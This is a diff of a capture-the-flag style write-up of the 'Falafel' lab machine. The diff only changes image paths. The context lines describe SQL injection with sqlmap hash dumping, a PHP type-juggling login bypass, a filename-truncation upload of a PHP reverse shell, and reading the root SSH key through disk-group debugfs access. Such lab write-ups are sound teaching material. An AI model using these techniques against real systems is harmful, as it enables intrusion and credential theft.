@@ -44,26 +44,26 @@ Not a whole lot we can do with that version of OpenSSH without credentials so I 
 ## Website Enumeration
 Checking out the landing page shows a welcome message for the FalafeLovers company, which looks to be a social media site catered towards people who love falafel. At the end of it gives us an email for the IT staff as well as a domain name of `falafel.htb` that can be added to our `/etc/hosts` file.
 
-![](../assets/img/2026-05-19-Falafel/1.png)
+![](/assets/img/2026-05-19-Falafel/1.png)
 
 A quick look at the `robots.txt` page intrigues me since it's disallowing web crawlers to index any text files on the server. I end up not finding anything right now, but this is important to note.
 
-![](../assets/img/2026-05-19-Falafel/2.png)
+![](/assets/img/2026-05-19-Falafel/2.png)
 
 ## SQL Injection in Login Panel
 The only other thing on the site is a login panel that reveals that it is built with PHP. Attempting to use default credentials such as `admin:password` returns an error saying wrong identification.
 
-![](../assets/img/2026-05-19-Falafel/3.png)
+![](/assets/img/2026-05-19-Falafel/3.png)
 
 Supplying a name that should not exist in the database will throw an error telling us to try again. We can definitely enumerate usernames on the site, but before doing any brute-forcing, I want to check for SQL injection and any other authentication bypasses.
 
 Attempting to supply a simple `'OR 1=1--` query into the username field confirms that this page is injectable due to it responding with a valid user in the database.
 
-![](../assets/img/2026-05-19-Falafel/4.png)
+![](/assets/img/2026-05-19-Falafel/4.png)
 
 However, using different operators like UNION to enumerate the database triggers a detection and blocks our query.
 
-![](../assets/img/2026-05-19-Falafel/5.png)
+![](/assets/img/2026-05-19-Falafel/5.png)
 
 With UNION queries being blocked, we'll most likely have to exploit some kind of time-based or boolean-based attack which exponentially increases the time we spend here. For that reason I'll use an automated tool to speed things up.
 
@@ -85,7 +85,7 @@ I'll start by capturing a request to the login panel in Burp Suite, saving it to
 └─$ sqlmap -r login.req --batch --level 5 --risk 3
 ```
 
-![](../assets/img/2026-05-19-Falafel/6.png)
+![](/assets/img/2026-05-19-Falafel/6.png)
 
 This confirms the previous suspicion and identifies one possible attack in the username parameter. Next I'll enumerate all databases to see what to poke at.
 
@@ -93,7 +93,7 @@ This confirms the previous suspicion and identifies one possible attack in the u
 └─$ sqlmap -r login.req --batch --dbs
 ```
 
-![](../assets/img/2026-05-19-Falafel/7.png)
+![](/assets/img/2026-05-19-Falafel/7.png)
 
 It returns just two, with the first being standard in MySQL applications so I'll fetch the tables from the second.
 
@@ -101,7 +101,7 @@ It returns just two, with the first being standard in MySQL applications so I'll
 └─$ sqlmap -r login.req --batch -D falafel --tables
 ```
 
-![](../assets/img/2026-05-19-Falafel/8.png)
+![](/assets/img/2026-05-19-Falafel/8.png)
 
 This DB only has a users table, so let's dump it.
 
@@ -109,7 +109,7 @@ This DB only has a users table, so let's dump it.
 └─$ sqlmap -r login.req --batch -D falafel -T users --dump
 ```
 
-![](../assets/img/2026-05-19-Falafel/9.png)
+![](/assets/img/2026-05-19-Falafel/9.png)
 
 ### Hidden Note
 While waiting for the SQLMap results to slowly pile in, I revisited my fuzzing attempts for `.txt` files on the server with a larger wordlist and end up getting a hit on `cyberlaw.txt`. 
@@ -168,7 +168,7 @@ Looks like the admin left a message for their lawyer and developers exclaiming t
 
 If we attempt to view the `/uploads` directory listing, the site forbids us but perhaps if we know the filename, it will be possible to have the server execute it.
 
-![](../assets/img/2026-05-19-Falafel/10.png)
+![](/assets/img/2026-05-19-Falafel/10.png)
 
 At this point, SQLMap has finished and gives us MD5 hashes for two users on the site. Only Chris's cracks so we can log into the site as him, but I note that the admin's hash looks strange since there's only one character in it.
 
@@ -177,7 +177,7 @@ At this point, SQLMap has finished and gives us MD5 hashes for two users on the 
 ### Type Juggling & Magic Hashes
 On the dashboard we're greeted with a message from Chris who explains that he pentests random site's in his spare time. The last line in his message is an obvious hint toward PHP type juggling.
 
-![](../assets/img/2026-05-19-Falafel/11.png)
+![](/assets/img/2026-05-19-Falafel/11.png)
 
 I recommend reading through [PayloadAllTheThings' page](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type%20Juggling/README.md) on this topic to get a better understanding on it as well as a few more examples, but I'll do my best to explain it here.
 
@@ -185,33 +185,33 @@ PHP type juggling occurs because PHP will automatically convert variables betwee
 
 Going through a few of the "Magic Hashes", we can a few that look similar to the Admin's in the database, specifically all starting with 0e.
 
-![](../assets/img/2026-05-19-Falafel/12.png)
+![](/assets/img/2026-05-19-Falafel/12.png)
 
 If we go down the list supplying these values as the Admin's password, we're able to login as them with 240610708 and access the image upload function.
 
-![](../assets/img/2026-05-19-Falafel/13.png)
+![](/assets/img/2026-05-19-Falafel/13.png)
 
 ### RCE via Image Upload
 Hosting a test file on my local machine and giving it to the upload URL succeeds. We can also see how the PHP developer decided to mitigate access to the uploads directory by creating new randomized directory names and then placing our file within it.
 
-![](../assets/img/2026-05-19-Falafel/14.png)
+![](/assets/img/2026-05-19-Falafel/14.png)
 
 If we navigate to the randomized directory and search for our filename, it's possible to access it. Mine fails due to it being a fake PNG file.
 
-![](../assets/img/2026-05-19-Falafel/15.png)
+![](/assets/img/2026-05-19-Falafel/15.png)
 
 Trying to upload PHP files doesn't work due to a bad extension name. I spent some time using different combinations like `.php.png`, `.php5`, and `.phar` but they all fail. The site is most likely whitelisting valid image extensions, so we must find another way around this.
 
-![](../assets/img/2026-05-19-Falafel/16.png)
+![](/assets/img/2026-05-19-Falafel/16.png)
 
 ### Filename Truncation
 Checking out the Admin's profile shows a quote from an Anonymous person speaking about limits. 
 
-![](../assets/img/2026-05-19-Falafel/17.png)
+![](/assets/img/2026-05-19-Falafel/17.png)
 
 Taking this as another hint, I supply an extremely long URL to the site which returns a strange error.
 
-![](../assets/img/2026-05-19-Falafel/18.png)
+![](/assets/img/2026-05-19-Falafel/18.png)
 
 Instead of the site just denying or erroring out when provided with a long URL, it attempts to shorten it to the maximum allowed. Crucially, our file is still being uploaded to the site, only with a new alias. This means that whatever's past the point that gets chopped off won't be apart of the uploaded name. Perhaps we can use this to force the application into removing the `.png` portion from our `.php.png` file and bypass the upload filter.
 
@@ -232,11 +232,11 @@ http://10.10.14.243/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 ### Initial Foothold
 Using this new long URL at the image upload succeeds to grab it from our local machine.
 
-![](../assets/img/2026-05-19-Falafel/19.png)
+![](/assets/img/2026-05-19-Falafel/19.png)
 
 If we check the source code of the page (because the page renders it outside of our view), we find that our filename was saved under a new alias with just the `.php` extension. 
 
-![](../assets/img/2026-05-19-Falafel/20.png)
+![](/assets/img/2026-05-19-Falafel/20.png)
 
 Taking note of the directory name it was uploaded to, we can now setup a Netcat listener and navigate to our file to get a shell on the machine as `www-data`. I also upgrade and stabilize my shell via the typical `Python import pty` method.
 
@@ -244,7 +244,7 @@ Taking note of the directory name it was uploaded to, we can now setup a Netcat 
 └─$ nc -lnvp 443
 ```
 
-![](../assets/img/2026-05-19-Falafel/21.png)
+![](/assets/img/2026-05-19-Falafel/21.png)
 
 At this point we can begin enumerating the filesystem, focusing on finding routes to escalate privileges towards root.
 
@@ -258,7 +258,7 @@ This reveals a `connection.php` file containing database credentials for the Mos
 └─$ cat /var/www/html/connection.php
 ```
 
-![](../assets/img/2026-05-19-Falafel/22.png)
+![](/assets/img/2026-05-19-Falafel/22.png)
 
 These are reused for SSH and allow us to grab a proper shell as well as the user flag inside of their home directory.
 
@@ -266,7 +266,7 @@ These are reused for SSH and allow us to grab a proper shell as well as the user
 └─$ ssh moshe@falafel.htb
 ```
 
-![](../assets/img/2026-05-19-Falafel/23.png)
+![](/assets/img/2026-05-19-Falafel/23.png)
 
 ### Reconstructing Credential Image
 Interestingly, Moshe is in quite a lot of groups on the system. This [ArchWiki page](https://wiki.archlinux.org/title/Users_and_groups#Group_list) explains what they all of them are used for, so I go down the list enumerating all access points.
@@ -277,7 +277,7 @@ Our presence in the Adm group will let us read certain log files. I grepped thro
 └─$ grep -iR password
 ```
 
-![](../assets/img/2026-05-19-Falafel/24.png)
+![](/assets/img/2026-05-19-Falafel/24.png)
 
 Eventually I land in the `/dev` directory where things related to audio and video are stored. Searching for devices that we can access reveals /fb0 which is the device file representing the primary framebuffer. Reading through the [documentation](https://www.kernel.org/doc/Documentation/fb/framebuffer.txt) shows that this provides an abstraction for the graphics hardware, meaning we may be able to render a video from it.
 
@@ -297,7 +297,7 @@ I'll cat the contents into an output file and transfer it to my local machine us
 └─$ scp moshe@falafel.htb:/home/moshe/output.raw .
 ```
 
-![](../assets/img/2026-05-19-Falafel/25.png)
+![](/assets/img/2026-05-19-Falafel/25.png)
 
 We'll also need to find the screen's resolution so it isn't distorted, which can be found in the `virtual_size` file under `/sys/class/graphics/fb0/`.
 
@@ -308,15 +308,15 @@ We'll also need to find the screen's resolution so it isn't distorted, which can
 
 With that in hand, we can use the [Gnu Image Manipulation Program](https://www.gimp.org/) (GIMP) tool to open this file as raw image data. First we can install it with `sudo apt install gimp -y`, navigate to the file open dialog, select our file and then specify the file type to match it.
 
-![](../assets/img/2026-05-19-Falafel/26.png)
+![](/assets/img/2026-05-19-Falafel/26.png)
 
 From the load screen, we specify the format to be RGB565 and have the resolution match the height and width from the earlier values gathered in virtual_size (`1176x885`).
 
-![](../assets/img/2026-05-19-Falafel/27.png)
+![](/assets/img/2026-05-19-Falafel/27.png)
 
 Opening the file will clearly grant us credentials for Yossi which can be used to login over SSH.
 
-![](../assets/img/2026-05-19-Falafel/28.png)
+![](/assets/img/2026-05-19-Falafel/28.png)
 
 ### Abusing Disk Privileges
 With access as Yossi, I repeat enumeration on the filesystem and once again go down the list of interesting group permissions. Our membership in the disk group allows us to read directly from the raw disks. Seems like **sda1** is the primary disk and **sda2** is the swap.
@@ -329,7 +329,7 @@ With access as Yossi, I repeat enumeration on the filesystem and once again go d
 └─$ swapon -s
 ```
 
-![](../assets/img/2026-05-19-Falafel/29.png)
+![](/assets/img/2026-05-19-Falafel/29.png)
 
 As I was unfamiliar with this group and its permissions, I did some digging which led me to this [HackingArticles post](https://www.hackingarticles.in/disk-group-privilege-escalation/). It explains that if someone in the disk group has access to the raw disks, we can read files since they are stored there.
 
@@ -341,7 +341,7 @@ We can use the debugfs tool in order to debug a filesystem. By specifying the pr
 └─$ cat /root/.ssh/id_rsa
 ```
 
-![](../assets/img/2026-05-19-Falafel/30.png)
+![](/assets/img/2026-05-19-Falafel/30.png)
 
 Finally, we can copy/paste this to our local machine and use it to login via SSH and get full access on the box.
 
@@ -351,7 +351,7 @@ Finally, we can copy/paste this to our local machine and use it to login via SSH
 └─$ ssh -i id_rsa root@falafel.htb
 ```
 
-![](../assets/img/2026-05-19-Falafel/31.png)
+![](/assets/img/2026-05-19-Falafel/31.png)
 
 That's all y'all, I enjoyed this box due to its realistic nature. Sometimes poor developers will badly implement a countermeasure to prevent a vulnerability from arising which doesn't fully stop attackers. The privesc portion was cool as it forced us to dig into the main Linux groups and what they're used for, which I certainly needed to do. 
 
